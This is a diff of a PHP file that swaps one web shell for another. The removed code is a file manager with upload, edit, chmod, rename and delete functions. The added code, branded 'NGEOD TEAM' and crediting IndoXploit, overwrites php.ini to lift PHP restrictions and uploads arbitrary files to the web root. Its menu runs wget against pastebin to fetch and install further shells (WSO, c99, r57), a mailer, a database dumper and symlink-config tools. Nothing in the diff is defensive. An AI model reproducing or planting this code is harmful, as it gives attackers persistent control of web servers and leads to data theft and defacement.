@@ -1,296 +1,214 @@
-<?php
-error_reporting(0);
-set_time_limit(0);
-
-if(get_magic_quotes_gpc()){
-foreach($_POST as $key=>$value){
-$_POST[$key] = stripslashes($value);
-}
-}
-echo '<!DOCTYPE HTML>
 <html>
 <head>
-<link href="" rel="stylesheet" type="text/css">
-<title>Try Hard</title>
-<style>
-body{
-font-family: "Racing Sans One", cursive;
-background-color: black;
-color:white;
+<title>??NGEOD??</title>
+<style type='text/css'>
+@import url(https://fonts.googleapis.com/css?family=Ubuntu);
+html {
+    background: #000000;
+    color: #ffffff;
+    font-family: 'Ubuntu';
+	font-size: 13px;
+	width: 100%;
 }
-#content tr:hover{
-background-color: blue;
-text-shadow:0px 0px 10px #fff;
+table, th, td {
+	border-collapse:collapse;
+	font-family: Tahoma, Geneva, sans-serif;
+	background: transparent;
+	font-family: 'Ubuntu';
+	font-size: 13px;
 }
-#content .first{
-background-color: blue;
+input[type=submit] {
+	background: transparent;
+	color: #ffffff;
+	height: 24px;
+	border: 1px solid #ffffff;
+	margin: 5px auto;
+	padding-left: 5px;
+	font-family: 'Ubuntu';
+	font-size: 13px;
 }
-table{
-border: 1px #000000 dotted;
-}
-a{
-color:white;
-text-decoration: none;
-}
-a:hover{
-color:blue;
-text-shadow:0px 0px 10px #ffffff;
-}
-input,select,textarea{
-border: 1px #000000 solid;
--moz-border-radius: 5px;
--webkit-border-radius:5px;
-border-radius:5px;
+select {
+	width: 152px;
+	background: #000000;
+	color: white;
+	border: 1px solid #ffffff;
+	margin: 5px auto;
+	padding-left: 5px;
+	font-family: 'Ubuntu';
+	font-size: 13px;
 }
 </style>
 </head>
-<body>
-<h1><center><font color="blue">XxX PerfectMoney xXx</font></center></h1>
-<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
-<tr><td><font color="white">Path :</font> ';
-if(isset($_GET['path'])){
-$path = $_GET['path'];
-}else{
-$path = getcwd();
+<center>
+<img src="http://orig07.deviantart.net/a89f/f/2016/229/1/4/deku_the_hero__izuku_midoriya__season_2_render_by_ironoakman-dadd99s.png" width="200px" height="270px"><br>
+<font color='red' size="6">??</font><font color='white' size="8">NGEOD TEAM</font><font color='red' size="6">??</font><br>
+<body bgcolor="black">
+<?php
+#######################
+#Thank's to IndoXploit#
+#######################
+error_reporting(E_ALL ^ (E_NOTICE | E_WARNING));
+$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=lime>NONE</font>";
+echo "<b><font color='green'><br>Server IP : ".gethostbyname($_SERVER['HTTP_HOST'])."</b></font>";
+echo "<b><font color='green'><br>".php_uname()."</b></font><br>";
+echo "<b><font color='green'>Disable Functions: $show_ds</b></font><br><br>";
+echo "<form method='post'>
+<input type='submit' name='funct' value='Bypass Disabled Functions'>
+</form>";
+if($_POST['funct']) {
+$file = 'php.ini';
+file_put_contents($file,'safe_mode = OFF
+disable_functions = NONE
+safe_mode_gid = OFF
+open_basedir = OFF');
+echo "<font color='green'>Sukses</font>";
 }
-$path = str_replace('\\','/',$path);
-$paths = explode('/',$path);
 
-foreach($paths as $id=>$pat){
-if($pat == '' && $id == 0){
-$a = true;
-echo '<a href="?path=/">/</a>';
-continue;
-}
-if($pat == '') continue;
-echo '<a href="?path=';
-for($i=0;$i<=$id;$i++){
-echo "$paths[$i]";
-if($i != $id) echo "/";
-}
-echo '">'.$pat.'</a>/';
-}
-echo '</td></tr><tr><td>';
-if(isset($_FILES['file'])){
-if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
-echo '<font color="green">Upload Berhasil</font><br />';
-}else{
-echo '<font color="red">Upload Gagal</font><br/>';
-}
-}
-echo '<form enctype="multipart/form-data" method="POST">
-<font color="white">File Upload :</font> <input type="file" name="file" />
-<input type="submit" value="upload" />
-</form>
-</td></tr>';
-if(isset($_GET['filesrc'])){
-echo "<tr><td>Current File : ";
-echo $_GET['filesrc'];
-echo '</tr></td></table><br />';
-echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
-}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
-echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
-if($_POST['opt'] == 'chmod'){
-if(isset($_POST['perm'])){
-if(chmod($_POST['path'],$_POST['perm'])){
-echo '<font color="green">Change Permission Berhasil</font><br/>';
-}else{
-echo '<font color="red">Change Permission Gagal</font><br />';
-}
-}
-echo '<form method="POST">
-Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
-<input type="hidden" name="path" value="'.$_POST['path'].'">
-<input type="hidden" name="opt" value="chmod">
-<input type="submit" value="Go" />
-</form>';
-}elseif($_POST['opt'] == 'rename'){
-if(isset($_POST['newname'])){
-if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
-echo '<font color="green">Ganti Nama Berhasil</font><br/>';
-}else{
-echo '<font color="red">Ganti Nama Gagal</font><br />';
-}
-$_POST['name'] = $_POST['newname'];
-}
-echo '<form method="POST">
-New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
-<input type="hidden" name="path" value="'.$_POST['path'].'">
-<input type="hidden" name="opt" value="rename">
-<input type="submit" value="Go" />
-</form>';
-}elseif($_POST['opt'] == 'edit'){
-if(isset($_POST['src'])){
-$fp = fopen($_POST['path'],'w');
-if(fwrite($fp,$_POST['src'])){
-echo '<font color="green">Berhasil Edit File</font><br/>';
-}else{
-echo '<font color="red">Gagal Edit File</font><br/>';
-}
-fclose($fp);
-}
-echo '<form method="POST">
-<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
-<input type="hidden" name="path" value="'.$_POST['path'].'">
-<input type="hidden" name="opt" value="edit">
-<input type="submit" value="Save" />
-</form>';
-}
-echo '</center>';
-}else{
-echo '</table><br/><center>';
-if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
-if($_POST['type'] == 'dir'){
-if(rmdir($_POST['path'])){
-echo '<font color="green">Directory Terhapus</font><br/>';
-}else{
-echo '<font color="red">Directory Gagal Terhapus                                                                                                                                                                                                                                                                                             </font><br/>';
-}
-}elseif($_POST['type'] == 'file'){
-if(unlink($_POST['path'])){
-echo '<font color="green">File Terhapus</font><br/>';
-}else{
-echo '<font color="red">File Gagal Dihapus</font><br/>';
-}
-}
-}
-echo '</center>';
-if(function_exists('opendir')) {
-	if($opendir = opendir($path)) {
-		while(($readdir = readdir($opendir)) !== false) {
-			$scandir[] = $readdir;
+echo "<font color='white'><form method='post' enctype='multipart/form-data'>
+	  <input type='file' name='file'>
+	  <input type='submit' name='upload' value='Upload!'>
+	  </form>";
+$root = $_SERVER['DOCUMENT_ROOT'];
+$files = $_FILES['file']['name'];
+$dest = $root.'/'.$files;
+if(isset($_POST['upload'])) {
+	if(is_writable($root)) {
+		if(@copy($_FILES['file']['tmp_name'], $dest)) {
+			$web = "http://".$_SERVER['HTTP_HOST']."/";
+			echo "sukses upload -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
+		} else {
+			echo "gagal upload di document root.";
 		}
-		closedir($opendir);
+	} else {
+		if(@copy($_FILES['file']['tmp_name'], $files)) {
+			echo "sukses upload <b>$files</b> di folder ini";
+		} else {
+			echo "gagal upload";
+		}
 	}
-	sort($scandir);
+}
+	echo"<table align=center>";
+    echo"<td>";
+    echo"<form method='post'> ";
+    echo"<select name='lucknut' style=padding:4px 10px;>";
+    echo"<option selected'>         Summoner Tools       </option>";
+    echo"<option value='zoneh'>         ZONE-H       </option>";
+    echo"<option value='defid'>         DEFACER ID       </option>";
+    echo"<option value='symconf'>         SYMLINK CONFIG       </option>";
+    echo"<option value='mails'>         MAILER       </option>";
+    echo"<option value='dump'>         DUMP DB       </option>";
+    echo"<option value='wso_shell'>         WSO SHELL       </option>";
+    echo"<option value='idx_shell'>         IDX SHELL       </option>";
+    echo"<option value='c99_shell'>         C99 SHELL       </option>";
+    echo"<option value='r57_shell'>         r57 SHELL      </option>";
+    echo"<option value='galerz_shell'>         GALERZ SHELL       </option>";
+    echo"<option value='t9_shell'>         T9 SHELL      </option>";
+    echo"<option value='az_shell'>         AZZAT SHELL      </option>";
+    echo"<option value='krdp'>         KRDP SHELL       </option>";
+    echo "</select>";
+    echo"&nbsp;<input type='submit' class='btn btn-success btn-sm' name='enter' value='Summon!'>";
+
+ if(isset($_POST['enter']))   {
+ if ($_POST['lucknut'] == 'wso_shell')  {
+ $exec=exec('wget http://pastebin.com/raw.php?i=Tpm5E10g -O wsoshell.php');
+ if(file_exists('./wsoshell.php')){
+ echo '<center><a href=./wsoshell.php target="_blank"> wso.php </a> upload sukses !</center>';
 } else {
-	$scandir = scandir($path);
+echo '<center>gagal upload !</center>';
 }
-echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
-<tr class="first">
-<td><center>Name</peller></center></td>
-<td><center>Size</peller></center></td>
-<td><center>Permission</peller></center></td>
-<td><center>Modify</peller></center></td>
-</tr>';
-
-foreach($scandir as $dir){
-if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
-echo '<tr>
-<td><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
-<td><center>--</center></td>
-<td><center>';
-if(is_writable($path.'/'.$dir)) echo '<font color="green">';
-elseif(!is_readable($path.'/'.$dir)) echo '<font color="blue">';
-echo perms($path.'/'.$dir);
-if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';
-
-echo '</center></td>
-<td><center><form method="POST" action="?option&path='.$path.'">
-<select name="opt">
-<option value="">Select</option>
-<option value="delete">Delete</option>
-<option value="chmod">Chmod</option>
-<option value="rename">Rename</option>
-</select>
-<input type="hidden" name="type" value="dir">
-<input type="hidden" name="name" value="'.$dir.'">
-<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
-<input type="submit" value=">">
-</form></center></td>
-</tr>';
-}
-echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
-foreach($scandir as $file){
-if(!is_file($path.'/'.$file)) continue;
-$size = filesize($path.'/'.$file)/1024;
-$size = round($size,3);
-if($size >= 1024){
-$size = round($size/1024,2).' MB';
-}else{
-$size = $size.' KB';
-}
-
-echo '<tr>
-<td><a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
-<td><center>'.$size.'</center></td>
-<td><center>';
-if(is_writable($path.'/'.$file)) echo '<font color="green">';
-elseif(!is_readable($path.'/'.$file)) echo '<font color="blue">';
-echo perms($path.'/'.$file);
-if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
-echo '</center></td>
-<td><center><form method="POST" action="?option&path='.$path.'">
-<select name="opt">
-<option value="">Select</option>
-<option value="delete">Delete</option>
-<option value="chmod">Chmod</option>
-<option value="rename">Rename</option>
-<option value="edit">Edit</option>
-</select>
-<input type="hidden" name="type" value="file">
-<input type="hidden" name="name" value="'.$file.'">
-<input type="hidden" name="path" value="'.$path.'/'.$file.'">
-<input type="submit" value=">">
-</form></center></td>
-</tr>';
-}
-echo '</table>
-</div>';
-}
-echo '<center><br/> OHA YOOOO </center>
-</body>
-</html>';
-function perms($file){
-$perms = fileperms($file);
-
-if (($perms & 0xC000) == 0xC000) {
-// Socket
-$info = 's';
-} elseif (($perms & 0xA000) == 0xA000) {
-// Symbolic Link
-$info = 'l';
-} elseif (($perms & 0x8000) == 0x8000) {
-// Regular
-$info = '-';
-} elseif (($perms & 0x6000) == 0x6000) {
-// Block special
-$info = 'b';
-} elseif (($perms & 0x4000) == 0x4000) {
-// Directory
-$info = 'd';
-} elseif (($perms & 0x2000) == 0x2000) {
-// Character special
-$info = 'c';
-} elseif (($perms & 0x1000) == 0x1000) {
-// FIFO pipe
-$info = 'p';
-} else {
-// Unknown
-$info = 'u';
-}
-
-// Owner
-$info .= (($perms & 0x0100) ? 'r' : '-');
-$info .= (($perms & 0x0080) ? 'w' : '-');
-$info .= (($perms & 0x0040) ?
-(($perms & 0x0800) ? 's' : 'x' ) :
-(($perms & 0x0800) ? 'S' : '-'));
-
-// Group
-$info .= (($perms & 0x0020) ? 'r' : '-');
-$info .= (($perms & 0x0010) ? 'w' : '-');
-$info .= (($perms & 0x0008) ?
-(($perms & 0x0400) ? 's' : 'x' ) :
-(($perms & 0x0400) ? 'S' : '-'));
-
-// World
-$info .= (($perms & 0x0004) ? 'r' : '-');
-$info .= (($perms & 0x0002) ? 'w' : '-');
-$info .= (($perms & 0x0001) ?
-(($perms & 0x0200) ? 't' : 'x' ) :
-(($perms & 0x0200) ? 'T' : '-'));
-
-return $info;
+}elseif ($_POST['lucknut'] == 'az_shell') {
+		$exec=exec('wget http://pastebin.com/raw.php?i=0vy06H1x -O azshell.php');
+        if(file_exists('./azshell.php')){
+            echo '<center><a href=./azshell.php target="_blank"> azshell.php </a> upload sukses !</center>';
+        } else {
+            echo '<center>gagal upload !</center>';
+        }
+}elseif ($_POST['lucknut'] == 't9_shell') {
+		$exec=exec('wget http://pastebin.com/raw.php?i=zMdY8xDn -O t9shell.php');
+        if(file_exists('./t9shell.php')){
+            echo '<center><a href=./t9shell.php target="_blank"> t9shell.php </a> upload sukses !</center>';
+        } else {
+            echo '<center>gagal upload !</center>';
+        }
+}elseif ($_POST['lucknut'] == 'galerz_shell') {
+		$exec=exec('wget http://pastebin.com/raw.php?i=S9tzBgg3 -O galerzshell.php');
+        if(file_exists('./galerzshell.php')){
+            echo '<center><a href=./galerzshell.php target="_blank"> galerzshell.php </a> upload sukses !</center>';
+        } else {
+            echo '<center>gagal upload !</center>';
+        }
+}elseif ($_POST['lucknut'] == 'r57_shell') {
+		$exec=exec('wget http://pastebin.com/raw.php?i=S9tzBgg3 -O r57shell.php');
+        if(file_exists('./r57shell.php')){
+            echo '<center><a href=./r57shell.php target="_blank"> r57shell.php </a> upload sukses !</center>';
+        } else {
+            echo '<center>gagal upload !</center>';
+        }
+}elseif ($_POST['lucknut'] == 'c99_shell') {
+		$exec=exec('wget http://pastebin.com/raw.php?i=Ms0ptnpH -O c99shell.php');
+        if(file_exists('./c99shell.php')){
+            echo '<center><a href=./c99shell.php target="_blank"> c99shell.php </a> upload sukses !</center>';
+        } else {
+            echo '<center>gagal upload !</center>';
+        }
+}elseif ($_POST['lucknut'] == 'idx_shell') {
+		$exec=exec('wget http://pastebin.com/raw.php?i=nC6pWh5a -O idxshell.php');
+        if(file_exists('./idxshell.php')){
+            echo '<center><a href=./idxshell.php target="_blank"> idxshell.php </a> upload sukses !</center>';
+        } else {
+            echo '<center>gagal upload !</center>';
+        }
+}else if ($_POST['lucknut'] == 'zoneh') {
+		$exec=exec('wget http://pastebin.com/raw.php?i=B1Dk3P8R -O zoneh.php');
+        if(file_exists('./zoneh.php')){
+            echo '<center><a href=./zoneh.php target="_blank"> zoneh.php </a> upload sukses !</center>';
+        } else {
+            echo '<center>gagal upload !</center>';
+        }
+}elseif ($_POST['lucknut'] == 'krdp') {
+		$exec=exec('wget http://pastebin.com/raw.php?i=weQnAGad -O krdp.php');
+        if(file_exists('./krdp.php')){
+            echo '<center><a href=./krdp.php target="_blank"> krdp.php </a> upload sukses !</center>';
+        } else {
+            echo '<center>gagal upload !</center>';
+        }
+}elseif ($_POST['lucknut'] == 'defid') {
+		$exec=exec('wget http://pastebin.com/raw.php?i=1b9bcZdH -O defid.php');
+        if(file_exists('./defid.php')){
+            echo '<center><a href=./defid.php target="_blank"> defid.php </a> upload sukses !</center>';
+        } else {
+            echo '<center>gagal upload !</center>';
+        }
+}elseif ($_POST['lucknut'] == 'krdp') {
+		$exec=exec('wget http://pastebin.com/raw.php?i=weQnAGad -O krdp.php');
+        if(file_exists('./krdp.php')){
+            echo '<center><a href=./krdp.php target="_blank"> krdp.php </a> upload sukses !</center>';
+        } else {
+            echo '<center>gagal upload !</center>';
+        }
+}elseif ($_POST['lucknut'] == 'symconf') {
+		$exec=exec('wget http://pastebin.com/raw.php?i=KyLM7awc -O symconf.php');
+        if(file_exists('./symconf.php')){
+            echo '<center><a href=./symconf.php target="_blank"> symconf.php </a> upload sukses !</center>';
+        } else {
+            echo '<center>gagal upload !</center>';
+        }
+}elseif ($_POST['lucknut'] == 'mails') {
+		$exec=exec('wget http://pastebin.com/raw.php?i=6rTJ1ubw -O mail.php');
+        if(file_exists('./mail.php')){
+            echo '<center><a href=./mail.php target="_blank"> mail.php </a> upload sukses !</center>';
+        } else {
+            echo '<center>gagal upload !</center>';
+        }
+}elseif ($_POST['lucknut'] == 'dump') {
+		$exec=exec('wget http://pastebin.com/raw.php?i=ZG1A2s4u -O dump.php');
+        if(file_exists('./dump.php')){
+            echo '<center><a href=./dump.php target="_blank"> dump.php </a> upload sukses !</center>';
+        } else {
+            echo '<center>gagal upload !</center>';
+        }
+     }
 }
 ?>
+</center>
+</html>
